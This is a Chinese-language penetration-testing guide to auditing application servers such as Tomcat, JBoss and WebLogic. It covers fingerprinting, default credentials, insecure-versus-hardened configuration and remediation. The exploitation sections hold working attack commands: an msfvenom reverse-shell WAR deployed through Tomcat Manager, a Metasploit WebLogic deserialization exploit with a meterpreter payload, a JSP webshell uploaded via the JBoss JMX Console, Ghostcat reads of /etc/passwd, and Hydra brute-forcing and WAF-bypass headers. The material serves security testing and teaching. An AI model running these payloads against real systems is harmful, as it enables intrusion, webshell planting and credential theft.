# 应用服务器配置审计方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对应用服务器（Tomcat、JBoss、WebLogic、WebSphere 等）配置安全审计的系统性方法论。应用服务器通常运行企业核心应用，配置错误可能导致严重的安全风险。

### 1.2 适用范围
- Apache Tomcat
- JBoss/WildFly
- Oracle WebLogic
- IBM WebSphere
- Jetty
- Undertow
- 其他 Java/应用服务器

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 应用服务器管理员
- 企业应用运维人员

---

## 第二部分：核心渗透技术专题

### 专题：应用服务器配置审计

#### 2.1 技术介绍

应用服务器是运行企业级应用程序的中间件平台，提供运行时环境、资源管理、安全控制等功能。由于配置复杂、功能强大，应用服务器常因配置不当成为攻击目标。

**常见配置错误类型：**

| 错误类型 | 描述 | 危害等级 |
|---------|------|---------|
| **默认凭证** | 管理控制台使用默认账号 | 严重 |
| **管理接口暴露** | 管理端面对外网开放 | 严重 |
| **示例应用未删除** | 默认应用包含漏洞 | 高 |
| **调试模式开启** | 调试接口可远程访问 | 高 |
| **反序列化漏洞** | 使用存在漏洞的组件 | 严重 |
| **日志配置不当** | 敏感信息记录到日志 | 中 |

**常见应用服务器及风险组件：**

| 服务器 | 风险组件/路径 | 默认端口 |
|-------|--------------|---------|
| **Tomcat** | Manager、Host Manager、Examples | 8080 |
| **JBoss** | JMX Console、Admin Console | 8080 |
| **WebLogic** | Console、T3 协议 | 7001 |
| **WebSphere** | Admin Console、SOAP | 9060 |
| **Jetty** | 默认配置 | 8080 |

#### 2.2 审计常见于哪些场景

| 场景 | 风险点描述 |
|-----|-----------|
| **企业应用部署** | ERP、CRM 等系统使用应用服务器 |
| **微服务架构** | Spring Boot 应用使用嵌入式容器 |
| **云环境部署** | 云主机上的应用服务器配置 |
| **容器化部署** | Docker 中的应用服务器镜像 |
| **DevOps 环境** | CI/CD 管道中的测试服务器 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. 服务器指纹识别**

```bash
# 获取服务器版本
curl -I http://target:8080/

# 使用专用脚本识别
whatweb http://target:8080/

# Nmap 脚本扫描
nmap -sV --script http-enum target
```

**2. 管理界面检测**

| 服务器 | 管理路径 |
|-------|---------|
| **Tomcat** | `/manager/html`、`/host-manager/html` |
| **JBoss** | `/jmx-console`、`/admin-console` |
| **WebLogic** | `/console`、`/wls-wsat` |
| **WebSphere** | `/ibm/console` |

**3. 默认凭证测试**

| 服务器 | 用户名 | 密码 |
|-------|-------|------|
| **Tomcat** | `tomcat` | `tomcat` |
| **Tomcat** | `admin` | `admin` |
| **JBoss** | `admin` | `admin` |
| **WebLogic** | `weblogic` | `weblogic`、`weblogic123` |
| **WebSphere** | `wasadmin` | `wasadmin` |

**4. 自动化检测**

```bash
# 使用 Metasploit 扫描
use auxiliary/scanner/http/tomcat_mgr_login

# 使用 Nuclei 扫描
nuclei -t http/vulnerabilities/tomcat/ -u target

# 使用专用工具
python tomcat-scan.py -u http://target:8080
```

##### 2.3.2 白盒测试

**1. Tomcat 配置检查**

```xml
<!-- tomcat-users.xml 检查 -->
<!-- ❌ 不安全：默认用户 -->
<user username="tomcat" password="tomcat" roles="manager-gui"/>

<!-- ✅ 安全：强密码、最小权限 -->
<user username="admin" password="Str0ng!Pass" roles="manager-gui"/>

<!-- server.xml 检查 -->
<!-- ❌ 不安全：AJP 端口暴露 -->
<Connector port="8009" protocol="AJP/1.3" />

<!-- ✅ 安全：限制 AJP 访问 -->
<Connector port="8009" protocol="AJP/1.3" 
           address="127.0.0.1" secret="your-secret" />
```

**2. WebLogic 配置检查**

```xml
<!-- 检查 config.xml -->
<!-- ❌ 不安全：T3 协议未限制 -->
<!-- ✅ 安全：配置 T3 过滤规则 -->
<filter>
    <filter-name>weblogic.security.utils.Filter</filter-name>
    <filter-class>weblogic.security.utils.Filter</filter-class>
</filter>
```

**3. JBoss 配置检查**

```xml
<!-- 检查 standalone.xml -->
<!-- ❌ 不安全：管理接口绑定所有接口 -->
<interface name="management" public-address="0.0.0.0"/>

<!-- ✅ 安全：仅绑定本地 -->
<interface name="management" public-address="127.0.0.1"/>
```

#### 2.4 漏洞利用方法

##### 2.4.1 Tomcat Manager 利用

```bash
# 1. 暴力破解登录
hydra -L users.txt -P passwords.txt \
      http://target:8080/manager/html

# 2. 部署恶意 WAR
msfvenom -p java/jsp_shell_reverse_tcp \
         LHOST=10.0.0.1 LPORT=4444 -o shell.war

curl -u admin:admin -T shell.war \
     "http://target:8080/manager/text/deploy?path=/shell"

# 3. 访问 Webshell
http://target:8080/shell/shell.jsp
```

##### 2.4.2 WebLogic 反序列化利用

```bash
# 使用 Metasploit
use exploit/multi/misc/weblogic_deserialize

# 设置参数
set RHOSTS target
set RPORT 7001
set payload java/meterpreter/reverse_tcp

# 执行
exploit
```

##### 2.4.3 JBoss JMX Console 利用

```bash
# 1. 访问 JMX Console
http://target:8080/jmx-console

# 2. 查找 DeploymentFileRepository MBean

# 3. 使用 storeFile 方法上传文件
http://target:8080/jmx-console/HtmlAdaptor?action=invokeOp
&name=jboss.admin:service=DeploymentFileRepository
&method=storeFile
&arg0=shell.jsp
&arg1=<%25Runtime.getRuntime().exec(request.getParameter("c"))%25>
&arg2=.jsp
&arg3=

# 4. 访问上传的文件
http://target:8080/shell.jsp?c=id
```

##### 2.4.4 AJP 协议利用（Ghostcat）

```bash
# CVE-2020-1938 利用
python ajpShooter.py http://target:8009 8080 /WEB-INF/web.xml read

# 读取任意文件
python ajpShooter.py http://target:8009 8080 /etc/passwd read

# 包含 JSP 文件执行代码
python ajpShooter.py http://target:8009 8080 /shell.jsp forward
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 认证绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **HTTP 参数污染** | 添加认证参数 | `?authenticated=true` |
| **路径遍历** | 绕过路径检查 | `/..;/manager/html` |
| **URL 编码** | 编码特殊字符 | `/%6D%61%6E%61%67%65%72/` |
| **HTTP 方法覆盖** | 使用 X-HTTP-Method-Override | `X-HTTP-Method-Override: PUT` |

##### 2.5.2 WAF 绕过

```bash
# 使用 HTTP/1.0 绕过
GET /manager/html HTTP/1.0
Host: target

# 添加额外头部
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /manager/html

# 使用分块传输编码
Transfer-Encoding: chunked
```

##### 2.5.3 网络限制绕过

```
# 通过 SSRF 访问内网管理界面
利用应用中的 SSRF 漏洞访问 http://127.0.0.1:8080/manager

# 通过反向连接绕过
目标主动连接攻击者，绕过入站限制
```

---

## 第三部分：附录

### 3.1 应用服务器安全配置速查

| 配置项 | Tomcat | WebLogic | JBoss |
|-------|--------|---------|-------|
| **修改默认端口** | server.xml Connector | config.xml | standalone.xml |
| **删除示例应用** | 删除 webapps/examples | 删除 samples | 删除 examples |
| **限制管理访问** | RemoteAddrValve | 管理通道 | 管理接口绑定 |
| **强认证配置** | tomcat-users.xml | 安全领域 | 属性文件 |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Metasploit** | 漏洞利用 | `use exploit/multi/http/tomcat_mgr_upload` |
| **Nuclei** | 漏洞扫描 | `nuclei -t http/vulnerabilities/` |
| **Hydra** | 暴力破解 | `hydra -L users.txt -P pass.txt http://target/manager/html` |
| **AJPShooter** | AJP 协议利用 | `python ajpShooter.py` |
| **WebLogicScan** | WebLogic 扫描 | `python WebLogicScan.py` |

### 3.3 修复建议

- [ ] 修改所有默认凭证
- [ ] 限制管理界面的网络访问
- [ ] 删除示例应用和文档
- [ ] 定期更新和打补丁
- [ ] 禁用不必要的协议（如 AJP、T3）
- [ ] 实施 SSL/TLS 加密
- [ ] 配置适当的日志记录
- [ ] 定期安全审计
